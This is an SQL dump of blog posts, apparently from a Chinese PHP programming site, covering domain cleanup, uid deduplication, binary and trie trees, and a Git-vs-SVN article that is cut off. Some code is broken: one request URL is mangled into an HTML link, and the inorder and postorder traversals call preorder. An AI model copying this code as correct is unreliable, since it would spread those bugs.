(99, 1, '清理域名', '', '', '&lt;p&gt;今天想把这台老机器web服务转成nginx,发现此机器上有太多废弃的域名了。写段代码清之&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n$opts = array(&lt;br /&gt;\r\n&amp;nbsp; ''http''=&amp;gt;array(&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''method''=&amp;gt;&quot;GET&quot;,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''timeout''=&amp;gt;5,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; )&lt;br /&gt;\r\n);&lt;/p&gt;\r\n&lt;p&gt;$context = stream_context_create($opts);&lt;/p&gt;\r\n&lt;p&gt;$file_handle = fopen(&quot;httpd-vhosts.conf&quot;, &quot;r&quot;);&lt;br /&gt;\r\nwhile (!feof($file_handle)) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $line = fgets($file_handle);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $line = trim($line);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(strpos($line,&quot;Root&quot;))&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo $line.&quot;\\n&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(preg_match(''/^[ServerName|ServerAli]/'',$line) )&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //echo $line;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $arr = explode(&quot; &quot;,$line);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; foreach($arr as $v)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if( strpos($v,''.'') )&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(''okin'' ==&amp;nbsp; file_get_contents(&quot;&lt;a href=&quot;http://www.canphp.com/admin/index.php/article/''http:/&quot;.$v.&quot;:8080&quot;,false,$context''&quot;&gt;http://&quot;.$v.&quot;:8080&quot;,false,$context&lt;/a&gt;) )&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo $v.&quot;\\n&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n}&lt;br /&gt;\r\nfclose($file_handle);&lt;/p&gt;\r\n&lt;p&gt;?&amp;gt;&lt;br /&gt;\r\n~&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/p&gt;\r\n', 1, 1, 0, 0, 1304429238, 1, 'admin'),
(100, 1, '用php数组对百万数据进行排重', '', '', '在平时的工作中，经常接到要对网站的会员进行站内信、手机短信、email进行群发信息的通知，用户列表一般由别的同事提供，当中难免会有重复，为了避免重复发送，所以我在进行发送信息前要对他们提供的用户列表进行排重，下面我以uid列表来讲讲我是如何利用php数组进行排重的。&lt;p&gt;　　假如得到一个uid列表，数量在百万行以上，格式如下：&lt;/p&gt;\r\n&lt;pre class=&quot;code&quot;&gt;100010001000100110001002......10001000......10001111&lt;/pre&gt;&lt;p&gt;　　其实利用php数组的特性，很好进行排重，我们先来看一下php数组的定义：PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。数组元素的值也可以是另一个数组。树形结构和多维数组也是允许的。&lt;/p&gt;\r\n&lt;p&gt;　　在php的数组中，键（keys）也称为索引，具有唯一性，我们正可以利用这一特性进行排重，示例代码如下：&lt;/p&gt;\r\n&lt;pre class=&quot;code&quot;&gt;&amp;lt;?php//定义一个数组，用于存放排重后的结果$result = array();//读取uid列表文件$fp = fopen(''test.txt'', ''r'');while(!feof($fp)){    $uid = fgets($fp);    $uid = trim($uid);    $uid = trim($uid, &quot;\\r&quot;);    $uid = trim($uid, &quot;\\n&quot;);    if($uid == '''')    {        continue;    }    //以uid为key去看该值是否存在    if(empty($result[$uid]))    {        $result[$uid] = 1;    }}fclose($fp);//将结果保存到文件$content = '''';foreach($result as $k =&amp;gt; $v){    $content .= $k.&quot;\\n&quot;;}$fp = fopen(''result.txt'', ''w'');fwrite($fp, $content);fclose($fp);?&amp;gt;&lt;/pre&gt;&lt;p&gt;　　20多行代码，就可以对百万以上的数据进行排重，效率也不错，非常实用。手机号、email，也可以采用这种方式进行排重。&lt;/p&gt;\r\n&lt;p&gt;　　还有，这可方法还可以用于两个文件进行排重的工作，如果你有两个uid列表文件，格式和上面的uid列表一样，示例程序如下：&lt;/p&gt;\r\n&lt;pre class=&quot;code&quot;&gt;&amp;lt;?php//定义数组，用于存放排重后的结果$result = array();//读取第一个uid列表文件，放入$result_1$fp = fopen(''test_1.txt'', ''r'');while(!feof($fp)){    $uid = fgets($fp);    $uid = trim($uid);    $uid = trim($uid, &quot;\\r&quot;);    $uid = trim($uid, &quot;\\n&quot;);    if($uid == '''')    {        continue;    }    //以uid为key写入$result，如有重复就会覆盖    $result[$uid] = 1;}fclose($fp);//读取第二个uid列表文件，并进行排重操作$fp = fopen(''test_2.txt'', ''r'');while(!feof($fp)){    $uid = fgets($fp);    $uid = trim($uid);    $uid = trim($uid, &quot;\\r&quot;);    $uid = trim($uid, &quot;\\n&quot;);    if($uid == '''')    {        continue;    }    //以uid为key去看该值是否存在    if(empty($result[$uid]))    {        $result[$uid] = 1;    }}fclose($fp);//$result里保存的就排重以后的结果，可以输出到文件，代码省略?&amp;gt;&lt;/pre&gt;', 1, 1, 0, 0, 1304429776, 1, 'admin'),
(101, 1, '二叉树PHP程序-算法', '', '', '&lt;p&gt;一个二叉树及二叉排序树的php版本。&lt;/p&gt;\r\n&lt;p&gt;&lt;/p&gt;\r\n&lt;pre class=&quot;brush:php&quot;&gt;&amp;lt;?php/**  * 二叉树的定义  */class BinaryTree {protected $key = NULL;      //  当前节点的值protected $left = NULL;     //  左子树protected $right = NULL;    //  右子树/**      * 以指定的值构造二叉树，并指定左右子树      ** @param mixed $key 节点的值.* @param mixed $left 左子树节点.* @param mixed $right 右子树节点.*/public function __construct( $key = NULL, $left = NULL, $right = NULL) {       $this-&amp;gt;key = $key;        if ($key === NULL) {            $this-&amp;gt;left = NULL;            $this-&amp;gt;right = NULL;        }        elseif ($left === NULL) {            $this-&amp;gt;left = new BinaryTree();            $this-&amp;gt;right = new BinaryTree();        }        else {            $this-&amp;gt;left = $left;            $this-&amp;gt;right = $right;        }    }    /**     * 析构方法.     */    public function __destruct() {        $this-&amp;gt;key = NULL;        $this-&amp;gt;left = NULL;        $this-&amp;gt;right = NULL;    }    /**    * 清空二叉树.    **/    public function purge () {        $this-&amp;gt;key = NULL;        $this-&amp;gt;left = NULL;        $this-&amp;gt;right = NULL;    }    /**     * 测试当前节点是否是叶节点.     *     * @return boolean 如果节点非空并且有两个空的子树时为真，否则为假.     */    public function isLeaf() {        return !$this-&amp;gt;isEmpty() &amp;amp;&amp;amp;            $this-&amp;gt;left-&amp;gt;isEmpty() &amp;amp;&amp;amp;            $this-&amp;gt;right-&amp;gt;isEmpty();    }    /**     * 测试节点是否为空     *     * @return boolean 如果节点为空返回真，否则为假.     */    public function isEmpty() {        return $this-&amp;gt;key === NULL;    }    /**     * Key getter.     *     * @return mixed 节点的值.     */    public function getKey() {        if ($this-&amp;gt;isEmpty()) {            return false;        }        return $this-&amp;gt;key;    }    /**     * 给节点指定Key值,节点必须为空     *     * @param mixed $object 添加的Key值.     */    public function attachKey($obj) {        if (!$this-&amp;gt;isEmpty())            return false;        $this-&amp;gt;key = $obj;        $this-&amp;gt;left = new BinaryTree();        $this-&amp;gt;right = new BinaryTree();    }    /**     * 删除key值，使得节点为空.     */    public function detachKey() {        if (!$this-&amp;gt;isLeaf())            return false;        $result = $this-&amp;gt;key;        $this-&amp;gt;key = NULL;        $this-&amp;gt;left = NULL;        $this-&amp;gt;right = NULL;        return $result;    }    /**     * 返回左子树     *     * @return object BinaryTree 当前节点的左子树.     */    public function getLeft() {        if ($this-&amp;gt;isEmpty())            return false;        return $this-&amp;gt;left;    }    /**     * 给当前结点添加左子树     *     * @param object BinaryTree $t 给当前节点添加的子树.     */    public function attachLeft(BinaryTree $t) {        if ($this-&amp;gt;isEmpty() || !$this-&amp;gt;left-&amp;gt;isEmpty())            return false;        $this-&amp;gt;left = $t;    }    /**     * 删除左子树     *     * @return object BinaryTree  返回删除的左子树.     */    public function detachLeft() {        if ($this-&amp;gt;isEmpty())            return false;        $result = $this-&amp;gt;left;        $this-&amp;gt;left = new BinaryTree();        return $result;    }    /**     * 返回当前节点的右子树     *     * @return object BinaryTree 当前节点的右子树.     */    public function getRight() {        if ($this-&amp;gt;isEmpty())            return false;        return $this-&amp;gt;right;    }    /**     * 给当前节点添加右子树     *     * @param object BinaryTree $t 需要添加的右子树.     */    public function attachRight(BinaryTree $t) {        if ($this-&amp;gt;isEmpty() || !$this-&amp;gt;right-&amp;gt;isEmpty())            return false;        $this-&amp;gt;right = $t;    }    /**     * 删除右子树，并返回此右子树     * @return object BinaryTree 删除的右子树.     */    public function detachRight() {        if ($this-&amp;gt;isEmpty ())            return false;        $result = $this-&amp;gt;right;        $this-&amp;gt;right = new BinaryTree();        return $result;    }    /**     * 先序遍历     */    public function preorderTraversal() {        if ($this-&amp;gt;isEmpty()) {            return ;        }        echo '' '', $this-&amp;gt;getKey();        $this-&amp;gt;getLeft()-&amp;gt;preorderTraversal();        $this-&amp;gt;getRight()-&amp;gt;preorderTraversal();    }    /**     * 中序遍历     */    public function inorderTraversal() {        if ($this-&amp;gt;isEmpty()) {            return ;        }        $this-&amp;gt;getLeft()-&amp;gt;preorderTraversal();        echo '' '', $this-&amp;gt;getKey();        $this-&amp;gt;getRight()-&amp;gt;preorderTraversal();    }    /**     * 后序遍历     */    public function postorderTraversal() {        if ($this-&amp;gt;isEmpty()) {            return ;        }        $this-&amp;gt;getLeft()-&amp;gt;preorderTraversal();        $this-&amp;gt;getRight()-&amp;gt;preorderTraversal();        echo '' '', $this-&amp;gt;getKey();    }}/** * 二叉排序树的PHP实现 */class BST extends BinaryTree {  /**     * 构造空的二叉排序树     */    public function __construct() {        parent::__construct(NULL, NULL, NULL);    }    /**     * 析构     */    public function __destruct() {        parent::__destruct();    }    /**     * 测试二叉排序树中是否包含参数所指定的值     *     * @param mixed $obj 查找的值.     * @return boolean True 如果存在于二叉排序树中则返回真，否则为假期     */    public function contains($obj) {        if ($this-&amp;gt;isEmpty())            return false;        $diff = $this-&amp;gt;compare($obj);        if ($diff == 0) {            return true;        }elseif ($diff &amp;lt; 0)             return $this-&amp;gt;getLeft()-&amp;gt;contains($obj);        else            return $this-&amp;gt;getRight()-&amp;gt;contains($obj);    }    /**     * 查找二叉排序树中参数所指定的值的位置     *     * @param mixed $obj 查找的值.     * @return boolean True 如果存在则返回包含此值的对象，否则为NULL     */    public function find($obj) {        if ($this-&amp;gt;isEmpty())            return NULL;        $diff = $this-&amp;gt;compare($obj);        if ($diff == 0)            return $this-&amp;gt;getKey();        elseif ($diff &amp;lt; 0)             return $this-&amp;gt;getLeft()-&amp;gt;find($obj);        else            return $this-&amp;gt;getRight()-&amp;gt;find($obj);    }    /**     * 返回二叉排序树中的最小值     * @return mixed 如果存在则返回最小值，否则返回NULL     */    public function findMin() {        if ($this-&amp;gt;isEmpty ())            return NULL;        elseif ($this-&amp;gt;getLeft()-&amp;gt;isEmpty())            return $this-&amp;gt;getKey();        else            return $this-&amp;gt;getLeft()-&amp;gt;findMin();    }    /**     * 返回二叉排序树中的最大值     * @return mixed 如果存在则返回最大值，否则返回NULL     */    public function findMax() {        if ($this-&amp;gt;isEmpty ())            return NULL;        elseif ($this-&amp;gt;getRight()-&amp;gt;isEmpty())            return $this-&amp;gt;getKey();        else            return $this-&amp;gt;getRight()-&amp;gt;findMax();    }    /**     * 给二叉排序树插入指定值     *     * @param mixed $obj 需要插入的值.     * 如果指定的值在树中存在，则返回错误     */    public function insert($obj) {        if ($this-&amp;gt;isEmpty()) {            $this-&amp;gt;attachKey($obj);        } else {            $diff = $this-&amp;gt;compare($obj);            if ($diff == 0)                die(''argu error'');            if ($diff &amp;lt; 0)                 $this-&amp;gt;getLeft()-&amp;gt;insert($obj);            else                $this-&amp;gt;getRight()-&amp;gt;insert($obj);        }        $this-&amp;gt;balance();    } /**     * 从二叉排序树中删除指定的值     *     * @param mixed $obj 需要删除的值.     */    public function delete($obj) {        if ($this-&amp;gt;isEmpty ())            die();        $diff = $this-&amp;gt;compare($obj);        if ($diff == 0) {            if (!$this-&amp;gt;getLeft()-&amp;gt;isEmpty()) {                $max = $this-&amp;gt;getLeft()-&amp;gt;findMax();                $this-&amp;gt;key = $max;                $this-&amp;gt;getLeft()-&amp;gt;delete($max);            }            elseif (!$this-&amp;gt;getRight()-&amp;gt;isEmpty()) {                $min = $this-&amp;gt;getRight()-&amp;gt;findMin();                $this-&amp;gt;key = $min;                $this-&amp;gt;getRight()-&amp;gt;delete($min);            } else                $this-&amp;gt;detachKey();        } else if ($diff &amp;lt; 0)                 $this-&amp;gt;getLeft()-&amp;gt;delete($obj);            else                $this-&amp;gt;getRight()-&amp;gt;delete($obj);        $this-&amp;gt;balance();    }    public function compare($obj) {        return $obj - $this-&amp;gt;getKey();    }    /**     * Attaches the specified object as the key of this node.     * The node must be initially empty.     *     * @param object IObject $obj The key to attach.     * @exception IllegalOperationException If this node is not empty.     */    public function attachKey($obj) {        if (!$this-&amp;gt;isEmpty())            return false;        $this-&amp;gt;key = $obj;        $this-&amp;gt;left = new BST();        $this-&amp;gt;right = new BST();    }    /**     * Balances this node.     * Does nothing in this class.     */    protected function balance () {}    /**     * Main program.     *     * @param array $args Command-line arguments.     * @return integer Zero on success; non-zero on failure.     */    public static function main($args) {        printf(&quot;BinarySearchTree main program.\\n&quot;);        $root = new BST();        foreach ($args as $row) {            $root-&amp;gt;insert($row);        }        return $root;    }}$root = BST::main(array(50, 3, 10, 5, 100, 56, 78));echo $root-&amp;gt;findMax();$root-&amp;gt;delete(100);echo $root-&amp;gt;findMax();&lt;/pre&gt;', 1, 1, 0, 0, 1304515774, 1, 'admin'),
(102, 1, 'Trie树|字典树的简介及实现', '', '', '&lt;font face=&quot;楷体_GB2312&quot;&gt;Trie,又称字典树、单词查找树,是一种树形结构，用于保存大量的字符串。它的优点是：利用字符串的公共前缀来节约存储空间。&lt;br /&gt;\r\n相对来说,Trie树是一种比较简单的数据结构.理解起来比较简单,正所谓简单的东西也得付出代价.故Trie树也有它的缺点,Trie树的内存消耗非常大.当然,或许用左儿子右兄弟的方法建树的话,可能会好点.&lt;br /&gt;\r\n&lt;/font&gt;&lt;p&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;其基本性质可以归纳为：&lt;br /&gt;\r\n1. 根节点不包含字符，除根节点外每一个节点都只包含一个字符。 &lt;br /&gt;\r\n2. 从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。 &lt;br /&gt;\r\n3. 每个节点的所有子节点包含的字符都不相同。&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;其基本操作有:查找 插入和删除,当然删除操作比较少见.我在这里只是实现了对整个树的删除操作,至于单个word的删除操作也很简单.&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;span&gt;搜索字典项目的方法为：&lt;/span&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;span&gt;(1) 从根结点开始一次搜索；&lt;/span&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;span&gt;(2) 取得要查找关键词的第一个字母，并根据该字母选择对应的子树并转到该子树继续进行检索；&lt;/span&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;div align=&quot;left&quot;&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;span&gt;(3) 在相应的子树上，取得要查找关键词的第二个字母,&lt;/span&gt;并进一步选择对应的子树进行检索。&lt;/font&gt;&lt;/div&gt;\r\n&lt;div align=&quot;left&quot;&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;span&gt;(4) 迭代过程……&lt;/span&gt;&lt;/font&gt;&lt;/div&gt;\r\n&lt;div align=&quot;left&quot;&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;span&gt;(5) 在某个结点处，关键词的所有字母已被取出，则读取&lt;/span&gt;附在该结点上的信息，即完成查找。&lt;br /&gt;\r\n其他操作类似处理.&lt;br /&gt;\r\n&lt;/font&gt;&lt;/div&gt;\r\n&lt;p&gt;&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;/p&gt;\r\n&lt;div forimg=&quot;1&quot;&gt;&lt;a href=&quot;http://hiphotos.baidu.com/luyade1987/pic/item/1a63a209a1b3743e6a60fb0c.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img class=&quot;blogimg&quot; src=&quot;http://hiphotos.baidu.com/luyade1987/abpic/item/1a63a209a1b3743e6a60fb0c.jpg&quot; border=&quot;0&quot; small=&quot;1&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/font&gt;&lt;p&gt;&lt;/p&gt;\r\n&lt;font face=&quot;楷体_GB2312&quot; size=&quot;3&quot;&gt;&lt;font color=&quot;#0000ff&quot;&gt;/*&lt;br /&gt;\r\nName: Trie树的基本实现 &lt;br /&gt;\r\nAuthor: MaiK &lt;br /&gt;\r\nDescription: Trie树的基本实现 ,包括查找 插入和删除操作(卫星数据可以因情况而异) &lt;br /&gt;\r\n*/&lt;/font&gt;&lt;br /&gt;\r\n&lt;strong&gt;#include&amp;lt;algorithm&amp;gt;&lt;br /&gt;\r\n#include&amp;lt;iostream&amp;gt;&lt;br /&gt;\r\nusing namespace std;&lt;br /&gt;\r\n&lt;br /&gt;\r\nconst int sonnum=26,base=''a'';&lt;br /&gt;\r\nstruct Trie&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; int num;&lt;font color=&quot;#0000ff&quot;&gt;//to remember how many word can reach here,that is to say,prefix&lt;/font&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; bool terminal;&lt;font color=&quot;#0000ff&quot;&gt;//If terminal==true ,the current point has no following point&lt;/font&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; struct Trie *son[sonnum];&lt;font color=&quot;#0000ff&quot;&gt;//the following point&lt;/font&gt;&lt;br /&gt;\r\n};&lt;br /&gt;\r\nTrie *NewTrie()&lt;font color=&quot;#0000ff&quot;&gt;// create a new node&lt;/font&gt;&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Trie *temp=new Trie;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; temp-&amp;gt;num=1;temp-&amp;gt;terminal=false;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; for(int i=0;i&amp;lt;sonnum;++i)temp-&amp;gt;son[i]=NULL;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return temp;&lt;br /&gt;\r\n}&lt;br /&gt;\r\nvoid Insert(Trie *pnt,char *s,int len)&lt;font color=&quot;#0000ff&quot;&gt;// insert a new word to Trie tree&lt;/font&gt;&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Trie *temp=pnt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; for(int i=0;i&amp;lt;len;++i)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if(temp-&amp;gt;son[s[i]-base]==NULL)temp-&amp;gt;son[s[i]-base]=NewTrie();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; else temp-&amp;gt;son[s[i]-base]-&amp;gt;num++;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; temp=temp-&amp;gt;son[s[i]-base];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; temp-&amp;gt;terminal=true;&lt;br /&gt;\r\n}&lt;br /&gt;\r\nvoid Delete(Trie *pnt)&lt;font color=&quot;#0000ff&quot;&gt;// delete the whole tree&lt;/font&gt;&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; if(pnt!=NULL)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; for(int i=0;i&amp;lt;sonnum;++i)if(pnt-&amp;gt;son[i]!=NULL)Delete(pnt-&amp;gt;son[i]);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; delete pnt; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; pnt=NULL;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n}&lt;br /&gt;\r\nTrie* Find(Trie *pnt,char *s,int len)&lt;font color=&quot;#0000ff&quot;&gt;//trie to find the current word&lt;/font&gt;&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Trie *temp=pnt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; for(int i=0;i&amp;lt;len;++i)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if(temp-&amp;gt;son[s[i]-base]!=NULL)temp=temp-&amp;gt;son[s[i]-base];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; else return NULL;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return temp;&lt;br /&gt;\r\n}&lt;/strong&gt; &lt;br /&gt;\r\n&lt;/font&gt;', 1, 1, 0, 0, 1304515951, 1, 'admin'),
(103, 1, 'GIT和SVN之间的五个基本区别', '', '', '&lt;p&gt;如果你在读这篇文章，说明你跟大多数开发者一样对GIT感兴趣，如果你还没有机会来试一试GIT，我想现在你就要了解它了。&lt;/p&gt;\r\n &lt;p&gt;GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。如果你是一个具有使用SVN背景的人，你需要做一定的思想转换，来适应GIT提供的一些概念和特征。所以，这篇文章的主要目的就是通过介绍GIT能做什么、它和SVN在深层次上究竟有什么不同来帮助你认识它。&lt;/p&gt;\r\n &lt;p&gt;那好，这就开始吧…&lt;/p&gt;\r\n &lt;p&gt;&lt;span id=&quot;more-949&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\r\n &lt;ol&gt;&lt;li&gt;   &lt;h3&gt;GIT是分布式的，SVN不是：&lt;/h3&gt;\r\n   &lt;p&gt;这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。如果你能理解这个概念，那么你就已经上手一半了。需要做一点声明，GIT并不是目前第一个或唯一的分布式版本控制系统。还有一些系统，例如Bitkeeper, Mercurial等，也是运行在分布式模式上的。但GIT在这方面做的更好，而且有更多强大的功能特征。&lt;/p&gt;\r\n   &lt;p&gt;GIT跟SVN一样有自己的集中式版本库或服务器。但，GIT更倾向于被使用于分布式模式，也就是每个开发人员从中心版本库/服务器上chect out代码后会在自己的机器上克隆一个自己的版本库。可以这样说，如果你被困在一个不能连接网络的地方时，就像在飞机上，地下室，电梯里等，你仍然能够提 交文件，查看历史版本记录，创建项目分支，等。对一些人来说，这好像没多大用处，但当你突然遇到没有网络的环境时，这个将解决你的大麻烦。&lt;/p&gt;\r\n   